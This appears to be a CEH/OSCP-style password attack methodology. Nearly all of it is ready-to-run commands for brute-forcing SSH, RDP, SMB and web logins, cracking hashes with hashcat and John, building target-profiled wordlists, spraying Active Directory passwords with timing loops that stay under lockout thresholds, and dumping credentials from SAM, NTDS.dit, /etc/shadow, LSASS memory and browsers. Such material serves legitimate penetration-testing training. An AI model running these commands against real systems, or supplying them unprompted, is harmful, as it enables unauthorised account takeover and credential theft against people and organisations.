# Password Attack Methodology

> Based on CEH Module 06 and OSCP — Password Cracking and Spraying

## Overview

Password attacks remain the most common path to initial access. This methodology covers online brute forcing, offline hash cracking, wordlist generation, rule-based mutations, password spraying, and GPU optimization.

**Prerequisites**: Identify authentication endpoints (SSH, RDP, HTTP login, SMB, Kerberos) or obtain password hashes (dumped from SAM, NTDS.dit, /etc/shadow, database, application config).

---

## Phase 1: Online Attacks (Live Service Brute Force)

Online attacks target running services directly. Respect account lockout policies to avoid detection and denial of service.

### Hydra

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 4

# FTP
hydra -l anonymous -P passwords.txt ftp://10.10.10.5

# RDP
hydra -l administrator -P passwords.txt rdp://10.10.10.5 -t 1

# SMB
hydra -L users.txt -P passwords.txt smb://10.10.10.5

# HTTP POST form
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# HTTP Basic Auth
hydra -l admin -P passwords.txt 10.10.10.5 http-get /admin/

# HTTP GET form with cookies
hydra -l admin -P passwords.txt 10.10.10.5 http-get-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect:H=Cookie: PHPSESSID=abc123"

# MySQL
hydra -l root -P passwords.txt mysql://10.10.10.5

# MSSQL
hydra -l sa -P passwords.txt mssql://10.10.10.5

# SMTP
hydra -l admin@corp.local -P passwords.txt smtp://10.10.10.5

# SNMP community string brute force
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  10.10.10.5 snmp

# Flags reference:
#   -l USER / -L FILE       Single user / user list
#   -p PASS / -P FILE       Single password / password list
#   -t THREADS              Parallel connections (default 16; use 1-4 for RDP/SMB)
#   -s PORT                 Custom port
#   -f                      Stop on first valid pair
#   -V                      Verbose (show each attempt)
#   -o FILE                 Output results to file
```

### Medusa

```bash
# SSH brute force
medusa -h 10.10.10.5 -u admin -P passwords.txt -M ssh

# Multiple hosts
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# SMB
medusa -h 10.10.10.5 -u administrator -P passwords.txt -M smbnt

# HTTP
medusa -h 10.10.10.5 -u admin -P passwords.txt -M http -m DIR:/admin -m AUTH:basic
```

### Ncrack

```bash
# SSH with timing control
ncrack -p ssh --user admin -P passwords.txt 10.10.10.5 -T 3

# RDP
ncrack -p rdp --user administrator -P passwords.txt 10.10.10.5

# Multiple services
ncrack -p ssh,ftp --user admin -P passwords.txt 10.10.10.5
```

### CrackMapExec (Network Services)

```bash
# SMB password spray (one password against many users)
crackmapexec smb 10.10.10.5 -u users.txt -p 'Summer2024!' --continue-on-success

# SMB brute force (each user with each password)
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success

# WinRM
crackmapexec winrm 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success

# MSSQL
crackmapexec mssql 10.10.10.5 -u sa -p passwords.txt

# LDAP
crackmapexec ldap 10.10.10.5 -u users.txt -p 'Summer2024!' --continue-on-success

# SSH
crackmapexec ssh 10.10.10.5 -u users.txt -p passwords.txt --continue-on-success
```

---

## Phase 2: Offline Cracking — hashcat

Offline cracking works against extracted hashes. No account lockout, no network latency, full GPU acceleration.

### hashcat Mode Reference

| Hash Type | Mode (-m) | Example Hash |
|-----------|-----------|-------------|
| MD5 | 0 | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 100 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA256 | 1400 | e3b0c44298fc1c149afbf4c8996fb924... |
| SHA512 | 1700 | cf83e1357eefb8bdf1542850d66d8007d... |
| bcrypt | 3200 | $2a$10$... |
| NTLM | 1000 | 31d6cfe0d16ae931b73c59d7e0c089c0 |
| NTLMv2 | 5600 | username::domain:challenge:response:blob |
| NetNTLMv1 | 5500 | username::domain:challenge:response |
| Kerberos TGS (RC4) | 13100 | $krb5tgs$23$*... |
| Kerberos AS-REP | 18200 | $krb5asrep$23$... |
| Kerberos TGS (AES256) | 19700 | $krb5tgs$17$... |
| WPA-PBKDF2 | 22000 | WPA*02*... |
| Linux shadow SHA-512 | 1800 | $6$rounds=5000$... |
| Linux shadow SHA-256 | 7400 | $5$... |
| MySQL 4.1+ | 300 | *6C8989366EAF6BBCD1 |
| MSSQL 2012+ | 1731 | 0x0200... |
| Oracle 11g | 112 | S:... |
| PostgreSQL MD5 | 12 | md5... |
| Cisco Type 5 | 500 | $1$... |
| Cisco Type 8 | 9200 | $8$... |
| Cisco Type 9 | 9300 | $9$... |

### hashcat Attack Modes

```bash
# Dictionary attack (mode 0)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (mode 0 with -r)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Combination attack (mode 1) — combines two wordlists
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Brute force / mask attack (mode 3)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'
#   ?l = lowercase  ?u = uppercase  ?d = digit
#   ?s = special     ?a = all        ?b = binary

# Mask with custom charsets
hashcat -m 1000 hashes.txt -a 3 -1 '?l?u' -2 '?d?s' '?1?1?1?1?2?2?2'

# Hybrid: wordlist + mask (mode 6)
hashcat -m 1000 hashes.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d'

# Hybrid: mask + wordlist (mode 7)
hashcat -m 1000 hashes.txt -a 7 '?d?d?d' /usr/share/wordlists/rockyou.txt

# Increment mode (try lengths 1-8)
hashcat -m 1000 hashes.txt -a 3 '?a?a?a?a?a?a?a?a' --increment --increment-min 1

# Show cracked passwords
hashcat -m 1000 hashes.txt --show

# Restore interrupted session
hashcat --restore
```

### hashcat Rules

```bash
# Built-in rules (ordered by effectiveness)
/usr/share/hashcat/rules/best64.rule           # Quick, good coverage
/usr/share/hashcat/rules/rockyou-30000.rule     # Larger, more mutations
/usr/share/hashcat/rules/d3ad0ne.rule           # Comprehensive
/usr/share/hashcat/rules/dive.rule              # Aggressive (slow)
/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule  # Community favorite

# Multiple rule files (stacks rules)
hashcat -m 1000 hashes.txt wordlist.txt -r rule1.rule -r rule2.rule

# Rule syntax basics:
#   l          = lowercase all
#   u          = uppercase all
#   c          = capitalize first, lower rest
#   t          = toggle case
#   $X         = append character X
#   ^X         = prepend character X
#   sa@        = substitute 'a' with '@'
#   ss$        = substitute 's' with '$'
#   r          = reverse word
#   d          = duplicate word
#   T0         = toggle case at position 0

# Custom rule example (save as custom.rule):
# c$1         = Capitalize + append 1   (password -> Password1)
# c$!         = Capitalize + append !   (password -> Password!)
# c$2$0$2$4   = Capitalize + append 2024 (password -> Password2024)
# sa@so0si!   = Leet speak substitutions (password -> p@ssw0rd -> p@$$w0rd)
```

---

## Phase 3: Offline Cracking — John the Ripper

```bash
# Basic dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=nt --wordlist=rockyou.txt ntlm_hashes.txt
john --format=raw-sha256 --wordlist=rockyou.txt sha256_hashes.txt
john --format=bcrypt --wordlist=rockyou.txt bcrypt_hashes.txt

# With rules
john --wordlist=rockyou.txt --rules=best64 hashes.txt
john --wordlist=rockyou.txt --rules=KoreLogic hashes.txt

# Incremental (brute force)
john --incremental hashes.txt
john --incremental=Digits --max-length=8 hashes.txt

# Show cracked passwords
john --show hashes.txt

# Unshadow Linux password files
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt

# Convert formats for john
ssh2john id_rsa > ssh_hash.txt
zip2john encrypted.zip > zip_hash.txt
rar2john encrypted.rar > rar_hash.txt
pdf2john encrypted.pdf > pdf_hash.txt
office2john document.docx > office_hash.txt
keepass2john database.kdbx > keepass_hash.txt
bitlocker2john image.raw > bitlocker_hash.txt
```

---

## Phase 4: Wordlist Generation

### Standard Wordlists

```bash
# rockyou — the classic (14 million passwords)
/usr/share/wordlists/rockyou.txt

# SecLists collection
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
/usr/share/seclists/Passwords/Leaked-Databases/
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt

# Weakpass collection (download separately)
# https://weakpass.com/
```

### Custom Wordlist Generation — CeWL

```bash
# Spider a target website for words (custom wordlist)
cewl https://corp.local -d 3 -m 5 -w custom_wordlist.txt
#   -d 3    = spider depth 3
#   -m 5    = minimum word length 5
#   --with-numbers  = include words with numbers

# Include email addresses
cewl https://corp.local -d 3 -m 5 -e --email_file emails.txt -w words.txt

# Combine with mutations
cewl https://corp.local -d 3 -m 5 -w - | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > mutated_wordlist.txt
```

### Custom Wordlist Generation — CUPP

```bash
# Interactive profiling (target's name, birthdate, pet, etc.)
cupp -i
# Follow prompts for target info:
# First name: John
# Surname: Smith
# Birthday: 01011990
# Partner name: Jane
# Pet: Buddy
# Company: AcmeCorp

# Output: john_smith.txt with targeted password candidates
```

### Username Wordlists

```bash
# Generate username variations from a name list
# names.txt: "John Smith"
cat names.txt | while read first last; do
  echo "${first,,}"
  echo "${last,,}"
  echo "${first,,}.${last,,}"
  echo "${first:0:1}${last,,}"
  echo "${first,,}${last:0:1}"
  echo "${first,,}_${last,,}"
  echo "${first,,}${last,,}"
done > usernames.txt

# namemash.py for automated generation
python3 namemash.py names.txt > usernames.txt

# Validate usernames against Kerberos (no lockout)
kerbrute userenum -d corp.local usernames.txt --dc 10.10.10.5
```

---

## Phase 5: Password Spraying

Spray one or two passwords across many accounts. Stay below the lockout threshold.

### Active Directory Spraying

```bash
# Kerbrute — fast, Kerberos-based, minimal log artifacts
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'
kerbrute passwordspray -d corp.local users.txt 'Welcome1!' --dc 10.10.10.5

# CrackMapExec — SMB spray
crackmapexec smb 10.10.10.5 -u users.txt -p 'Summer2024!' -d corp.local --continue-on-success

# CrackMapExec — LDAP spray (less noisy than SMB)
crackmapexec ldap 10.10.10.5 -u users.txt -p 'Summer2024!' -d corp.local --continue-on-success

# Spray with multiple passwords (respecting lockout)
# spray.sh — one password at a time with sleep between rounds
for password in 'Summer2024!' 'Welcome1!' 'Password123!'; do
  echo "[*] Spraying: $password"
  crackmapexec smb 10.10.10.5 -u users.txt -p "$password" -d corp.local --continue-on-success
  echo "[*] Sleeping 35 minutes for lockout reset..."
  sleep 2100
done

# DomainPasswordSpray (PowerShell, from domain-joined machine)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Summer2024!' -OutFile sprayed.txt
Invoke-DomainPasswordSpray -Password 'Summer2024!' -UserList users.txt
```

### Common Spray Passwords

```
Season+Year+!     Summer2024!, Winter2024!, Spring2024!, Fall2024!
CompanyName+123!  AcmeCorp123!
Welcome1!         Welcome123!
Password1!        Password123!
Changeme1!        Changeme123!
Month+Year!       March2024!, January2024!
CityName+Year!    London2024!
```

### Lockout-Aware Strategy

```bash
# 1. Get the password policy first
crackmapexec smb 10.10.10.5 -u 'known_user' -p 'known_pass' --pass-pol

# Key policy values:
#   Account Lockout Threshold: 5 (lock after 5 failures)
#   Reset Account Lockout After: 30 mins
#   Account Lockout Duration: 30 mins

# 2. Strategy: spray (threshold - 2) passwords per lockout window
#    If threshold = 5, spray max 3 passwords, then wait 30+ minutes

# 3. Check for fine-grained password policies (different thresholds per group)
crackmapexec ldap 10.10.10.5 -u user -p pass -M get-fgpp
```

---

## Phase 6: Rainbow Tables

Pre-computed hash-to-plaintext lookup tables. Fast lookup but requires massive storage.

```bash
# Generate rainbow tables with rtgen
rtgen md5 loweralpha-numeric 1 8 0 3800 33554432 0

# Sort the table
rtsort *.rt

# Crack using rcrack
rcrack /path/to/tables/ -h 5d41402abc4b2a76b9719d911017c592

# Online rainbow table lookup
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
# https://www.onlinehashcrack.com/

# Note: Rainbow tables are ineffective against salted hashes (bcrypt, SHA-512 crypt)
```

---

## Phase 7: GPU Optimization

### hashcat Performance Tuning

```bash
# Check available devices
hashcat -I

# Select specific GPU
hashcat -m 1000 hashes.txt wordlist.txt -d 1

# Optimize workload profile
hashcat -m 1000 hashes.txt wordlist.txt -w 3
#   -w 1 = Low (desktop usable)
#   -w 2 = Default
#   -w 3 = High (system may lag)
#   -w 4 = Nightmare (GPU fully saturated)

# Benchmark all hash types
hashcat -b

# Benchmark specific hash type
hashcat -b -m 1000

# Force specific backend (OpenCL vs CUDA)
hashcat -m 1000 hashes.txt wordlist.txt --backend-devices-virtual 1

# Temperature management
hashcat -m 1000 hashes.txt wordlist.txt --hwmon-temp-abort=90

# Status timer (show progress every N seconds)
hashcat -m 1000 hashes.txt wordlist.txt --status --status-timer=30

# Expected speeds (approximate, single RTX 4090):
#   NTLM (-m 1000):      ~160 GH/s
#   MD5 (-m 0):           ~80 GH/s
#   SHA1 (-m 100):        ~25 GH/s
#   SHA256 (-m 1400):     ~10 GH/s
#   bcrypt (-m 3200):     ~180 KH/s
#   WPA (-m 22000):       ~2.5 MH/s
#   Kerberos 5 (-m 13100): ~1.5 GH/s
```

### Distributed Cracking

```bash
# hashcat brain server (deduplication across multiple nodes)
# Server:
hashcat --brain-server --brain-port 13743 --brain-password secret

# Clients:
hashcat -m 1000 hashes.txt wordlist.txt --brain-client --brain-host server_ip \
  --brain-port 13743 --brain-password secret

# Hashtopolis — web-based distributed cracking manager
# Manages agents, tasks, wordlists, and rules across multiple GPU nodes
# https://github.com/hashtopolis/server
```

---

## Hash Extraction Quick Reference

```bash
# Windows SAM (local accounts)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak   # From admin cmd

# Active Directory NTDS.dit (all domain accounts)
impacket-secretsdump corp.local/admin:password@dc01 -just-dc-ntlm

# Linux /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# LSASS memory dump
# Mimikatz: sekurlsa::logonpasswords
# comsvcs.dll: rundll32.exe comsvcs.dll, MiniDump <PID> lsass.dmp full
# pypykatz: pypykatz lsa minidump lsass.dmp

# Responder captured hashes (NTLMv2)
cat /usr/share/responder/logs/*.txt

# Browser stored passwords
# LaZagne: python3 laZagne.py all
# SharpChromium: .\SharpChromium.exe logins

# Database password hashes
# MySQL: SELECT user, authentication_string FROM mysql.user;
# PostgreSQL: SELECT usename, passwd FROM pg_shadow;
# MSSQL: SELECT name, password_hash FROM sys.sql_logins;
```
